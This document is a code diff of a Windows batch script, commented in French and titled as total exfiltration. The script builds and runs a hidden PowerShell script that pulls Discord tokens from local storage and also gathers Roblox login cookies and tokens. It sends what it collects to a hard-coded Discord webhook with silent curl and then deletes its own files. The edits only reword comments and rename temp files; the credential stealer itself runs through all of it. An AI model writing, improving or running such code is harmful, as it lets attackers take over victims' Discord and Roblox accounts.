@@ -1,12 +1,12 @@
 @echo off
 setlocal enabledelayedexpansion
-:: PALOFSC - EXFILTRATION SANS MESSAGES D'ERREUR (VERSION FICHIER .PS1)
+:: PALOFSC - EXFILTRATION TOTALE (CREATION PS1 VALIDE)
 
 set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
 
-:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL (contenu exact, sans erreur)
-set "psfile=%TEMP%\extract_tokens.ps1"
-set "outfile=%TEMP%\tokens_output.txt"
+:: ETAPE 1 : CREER LE FICHIER POWERSHELL AVEC UN BLOC HEREDOC (echappement correct)
+set "psfile=%TEMP%\extract.ps1"
+set "outfile=%TEMP%\tokens.txt"
 (
 echo $paths = @(
 echo     "$env:APPDATA\Discord\Local Storage\leveldb",
@@ -24,10 +24,10 @@ echo }
 echo $tokens -join ' ' ^| Out-File -FilePath '%outfile%' -Encoding utf8
 ) > "%psfile%"
 
-:: ETAPE 2 : EXECUTION DU SCRIPT POWERSHELL AVEC -NOLOGO ET REDIRECTION DES ERREURS
+:: ETAPE 2 : EXECUTER LE POWERSHELL AVEC -NOLOGO ET REDIRECTION DES ERREURS
 powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul
 
-:: ETAPE 3 : LECTURE DU FICHIER DE SORTIE (s'il existe)
+:: ETAPE 3 : LIRE LE FICHIER DE SORTIE (si non vide)
 set "tokens="
 if exist "%outfile%" (
     for /f "usebackq delims=" %%a in ("%outfile%") do set "tokens=%%a"
@@ -53,14 +53,14 @@ if not "!roblox_pass!"=="" set "msg=!msg!Roblox RememberMe : !roblox_pass!\n"
 if not "!roblox_token!"=="" set "msg=!msg!Roblox Token : !roblox_token!\n"
 if "!msg!"=="" set "msg=Aucune donnee collectee.\n"
 
-:: Echappement JSON (guillemets et sauts de ligne)
+:: Echappement JSON
 set "msg=!msg:"=\"!"
 set "msg=!msg:\n=\\n!"
 
-:: ETAPE 6 : ENVOI VIA CURL (silencieux)
+:: ETAPE 6 : ENVOI VIA CURL
 curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1
 
-:: ETAPE 7 : NETTOYAGE ET SUPPRESSION DU SCRIPT
+:: ETAPE 7 : NETTOYAGE ET AUTO-SUPPRESSION
 set "tokens="
 set "roblox_user="
 set "roblox_pass="
